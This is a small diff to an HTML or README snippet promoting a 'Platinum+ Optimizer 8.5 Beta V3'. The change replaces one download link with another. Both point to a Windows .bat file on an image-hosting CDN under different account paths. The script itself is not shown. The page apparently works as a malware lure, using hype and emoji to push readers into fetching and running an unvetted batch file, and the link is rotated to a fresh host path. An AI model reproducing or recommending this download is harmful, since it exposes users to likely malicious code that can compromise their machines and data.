@@ -1,7 +1,7 @@
 <div align="center">
 <h2 style="color: #333; font-family: Arial, sans-serif; margin-bottom: 10px;">
     Platinum+ Optimizer 8.5 Beta V3 is now released🔥❗<br>
-    <a href="https://ik.imagekit.io/clcrylnuj/Platinum+Optimizer.8.5.Beta.V3.bat" target="_blank" style="color: #007bff; text-decoration: none;">
+    <a href="https://ik.imagekit.io/gc3sslajp/Platinum+Optimizer.8.5.Beta.V3.bat" target="_blank" style="color: #007bff; text-decoration: none;">
         Download now here📥
     </a>
 </h2>
